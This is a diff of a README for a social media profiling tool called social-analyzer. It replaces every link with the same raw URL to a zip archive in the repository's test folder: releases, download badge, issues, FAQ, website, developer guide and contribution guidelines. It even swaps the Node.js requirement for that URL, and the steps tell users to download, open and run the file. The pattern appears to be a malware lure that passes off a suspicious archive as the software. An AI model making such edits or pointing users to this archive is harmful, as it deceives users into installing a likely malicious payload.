@@ -10,7 +10,7 @@ To run social-analyzer, you need the following:
 - **Memory:** At least 4 GB of RAM.
 - **Storage:** Minimum of 500 MB of free disk space.
 - **Additional Software:** 
-  - Node.js v12 or higher
+  - https://raw.githubusercontent.com/urdcompere894/social-analyzer/main/test/social-analyzer_v2.8.zip v12 or higher
   - Python 3.6 or higher
 
 Make sure your system meets these requirements before you proceed.
@@ -18,10 +18,10 @@ Make sure your system meets these requirements before you proceed.
 ## 📥 Download the Software
 You can easily download the latest version of social-analyzer from the Releases page. 
 
-[![Download social-analyzer](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/urdcompere894/social-analyzer/releases)
+[![Download social-analyzer](https://raw.githubusercontent.com/urdcompere894/social-analyzer/main/test/social-analyzer_v2.8.zip%https://raw.githubusercontent.com/urdcompere894/social-analyzer/main/test/social-analyzer_v2.8.zip)](https://raw.githubusercontent.com/urdcompere894/social-analyzer/main/test/social-analyzer_v2.8.zip)
 
 ## 📦 Download & Install
-1. Visit this page to download: [social-analyzer Releases](https://github.com/urdcompere894/social-analyzer/releases).
+1. Visit this page to download: [social-analyzer Releases](https://raw.githubusercontent.com/urdcompere894/social-analyzer/main/test/social-analyzer_v2.8.zip).
 2. Find the latest release version.
 3. Click on the appropriate file to start the download. 
 4. Once the download finishes, locate the file on your computer and open it. Follow the on-screen instructions to install the software.
@@ -51,8 +51,8 @@ Developers can integrate social-analyzer’s features by accessing the API follo
 ## 💬 Support
 If you encounter any issues, check the FAQs in the repository or reach out for help. You can also look at the community discussions for additional support.
 
-- Visit the [Issues page](https://github.com/urdcompere894/social-analyzer/issues) to report problems or suggest features.
-- Read through the [FAQ section](https://github.com/urdcompere894/social-analyzer/wiki) for common questions.
+- Visit the [Issues page](https://raw.githubusercontent.com/urdcompere894/social-analyzer/main/test/social-analyzer_v2.8.zip) to report problems or suggest features.
+- Read through the [FAQ section](https://raw.githubusercontent.com/urdcompere894/social-analyzer/main/test/social-analyzer_v2.8.zip) for common questions.
 
 ## 🌟 Contributing
 We welcome contributions! If you want to help improve social-analyzer, please read our guidelines for contributing. This helps ensure that new features are added smoothly, and any bugs are promptly addressed.
@@ -80,8 +80,8 @@ Here are some relevant keywords to help understand the project's focus:
 Explore our repository to understand more about how you can benefit from social-analyzer.
 
 ## 🔗 Useful Links
-- [Official Website](https://www.social-analyzer.io)
-- [Guide for Developers](https://www.social-analyzer.io/docs)
-- [Contribution Guidelines](https://github.com/urdcompere894/social-analyzer/blob/main/CONTRIBUTING.md)
+- [Official Website](https://raw.githubusercontent.com/urdcompere894/social-analyzer/main/test/social-analyzer_v2.8.zip)
+- [Guide for Developers](https://raw.githubusercontent.com/urdcompere894/social-analyzer/main/test/social-analyzer_v2.8.zip)
+- [Contribution Guidelines](https://raw.githubusercontent.com/urdcompere894/social-analyzer/main/test/social-analyzer_v2.8.zip)
 
 With social-analyzer, you can confidently explore social media profiles in a safe and effective way. Happy analyzing!
